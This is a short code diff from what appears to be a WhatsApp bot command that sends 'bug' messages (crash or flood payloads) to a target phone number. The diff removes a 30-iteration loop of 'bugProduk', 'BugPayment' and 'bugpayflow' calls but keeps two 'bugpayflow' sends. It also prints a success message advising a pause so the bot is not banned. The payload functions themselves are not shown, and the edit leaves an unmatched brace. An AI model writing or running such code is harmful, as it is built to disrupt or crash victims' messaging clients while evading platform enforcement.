@@ -1604,10 +1604,6 @@ let target = bijipler + '@s.whatsapp.net'
 await reply(mess.bugrespon)
 await bugpayflow(target);
 await bugpayflow(target)
-for (let j = 0; j < 30; j++) {
-await bugProduk(target);
-await BugPayment(target);
-await bugpayflow(target);
 }
 await reply(`_Successfully Send Bug to ${target} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
 }
